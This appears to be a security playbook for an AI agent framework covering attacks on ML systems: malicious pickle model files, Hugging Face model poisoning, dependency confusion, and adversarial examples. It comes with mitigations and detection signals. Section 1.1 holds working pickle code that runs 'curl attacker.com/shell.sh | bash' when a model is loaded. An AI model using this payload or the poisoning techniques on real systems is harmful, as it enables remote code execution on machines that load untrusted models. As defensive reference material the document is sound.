---
name: ai-ml-security
description: >-
  AI/ML security playbook. Use when assessing model supply chain attacks (pickle RCE, poisoned weights), adversarial examples, model poisoning, model stealing, data privacy attacks (membership inference, model inversion), and autonomous agent security risks.
---

# SKILL: AI/ML Security — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: Expert AI/ML security techniques. Covers model supply chain attacks (malicious serialization, Hugging Face model poisoning), adversarial examples (FGSM, PGD, C&W, physical-world), training data poisoning, model extraction, data privacy attacks (membership inference, model inversion, gradient leakage), LLM-specific threats, and autonomous agent security. baseline analyses underestimate the severity of pickle deserialization RCE and the practicality of black-box model extraction.

## 0. RELATED ROUTING

- `llm-prompt-injection` for LLM-specific prompt injection, jailbreaking, and tool abuse techniques
- `deserialization-insecure` for deeper coverage of Python pickle and general deserialization attack patterns
- `dependency-confusion` when the ML pipeline has supply chain risks via pip/npm package confusion

---

## 1. MODEL SUPPLY CHAIN ATTACKS

### 1.1 Malicious Model Files — Pickle RCE

Python's `pickle` module executes arbitrary code during deserialization. PyTorch `.pt`/`.pth` files use pickle by default.

```python
import pickle
import os

class MaliciousModel:
    def __reduce__(self):
        return (os.system, ('curl attacker.com/shell.sh | bash',))

with open('model.pt', 'wb') as f:
    pickle.dump(MaliciousModel(), f)
```

Loading `torch.load('model.pt')` executes the embedded command. Applies to:

| Format | Risk | Mitigation |
|---|---|---|
| `.pt` / `.pth` (PyTorch) | **Critical** — pickle by default | Use `torch.load(..., weights_only=True)` (PyTorch ≥ 2.0) |
| `.pkl` / `.pickle` | **Critical** — raw pickle | Never load untrusted pickles |
| `.joblib` | **High** — uses pickle internally | Verify provenance |
| `.npy` / `.npz` (NumPy) | **Medium** — `allow_pickle=True` enables RCE | Use `allow_pickle=False` |
| `.safetensors` | **Safe** — tensor-only format, no code execution | Preferred format |
| `.onnx` | **Safe** — graph definition only, no arbitrary code | Preferred for inference |

### 1.2 Hugging Face Model Poisoning

```
Attack vectors:
├── Upload model with pickle-based backdoor to Hub
│   └── Users download via `from_pretrained('attacker/model')`
│       └── pickle deserialization → RCE on load
├── Backdoored weights (no RCE, but biased behavior)
│   └── Model behaves normally except on trigger inputs
│   └── Example: sentiment model returns positive for competitor's products
├── Malicious tokenizer config
│   └── Custom tokenizer code with embedded payload
└── Poisoned training scripts in model repo
    └── `train.py` with obfuscated backdoor
```

**Detection signals:**
- Files with `.pt`/`.pkl` extension instead of `.safetensors`
- Custom Python code in the repository (`*.py` files outside standard config)
- Unusual `config.json` with `trust_remote_code=True` requirement
- Model card lacking provenance, training data description, or eval results

### 1.3 Dependency Confusion in ML Pipelines

ML projects often have complex dependency chains:

```
requirements.txt:
  internal-ml-utils==1.2.3    ← private package
  torch==2.0.0
  transformers==4.30.0

Attack: register "internal-ml-utils" on public PyPI with higher version
→ pip installs attacker's version → arbitrary code in setup.py
```

---

## 2. ADVERSARIAL EXAMPLES

### 2.1 Attack Taxonomy

| Attack Type | Knowledge | Method |
|---|---|---|
| White-box | Full model access (architecture + weights) | Gradient-based: FGSM, PGD, C&W |
| Black-box (transfer) | Access to similar model | Generate adversarial on surrogate, transfer to target |
| Black-box (query) | API access only | Estimate gradients via finite differences or evolutionary methods |
| Physical-world | Camera/sensor input | Adversarial patches, glasses, modified objects |

### 2.2 FGSM (Fast Gradient Sign Method)

Single-step attack. Fast but less effective against robust models:

```python
epsilon = 0.03  # perturbation budget (L∞ norm)
x_adv = x + epsilon * sign(∇_x L(θ, x, y))
```

Perturbation is imperceptible to humans but changes classification.

### 2.3 PGD (Projected Gradient Descent)

Iterative version of FGSM. Stronger but slower:

```python
x_adv = x
for i in range(num_steps):
    x_adv = x_adv + alpha * sign(∇_x L(θ, x_adv, y))
    x_adv = clip(x_adv, x - epsilon, x + epsilon)  # project back to ε-ball
    x_adv = clip(x_adv, 0, 1)  # valid pixel range
```

### 2.4 C&W (Carlini & Wagner)

Optimization-based. Finds minimal perturbation to cause misclassification:

```
minimize: ||δ||₂ + c · f(x + δ)
where f(x + δ) < 0 iff misclassified
```

Most effective for targeted attacks (force specific wrong class).

### 2.5 Physical-World Adversarial

| Attack | Method | Impact |
|---|---|---|
| Adversarial patch | Printed sticker placed on object | Misclassification of physical objects |
| Adversarial glasses | Special frames with adversarial pattern | Face recognition evasion/impersonation |
| Stop sign perturbation | Small stickers on road signs | Autonomous vehicle misreads sign |
| Adversarial T-shirts | Printed pattern on clothing | Person detection evasion |
| Audio adversarial | Imperceptible audio perturbation | Voice assistant command injection |

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 3. MODEL POISONING
- 4. MODEL STEALING / EXTRACTION
- 5. DATA PRIVACY ATTACKS
- 6. LLM-SPECIFIC SECURITY (Cross-ref)
- 7. AGENT SECURITY
- 8. TOOLS & FRAMEWORKS
- 9. DECISION TREE
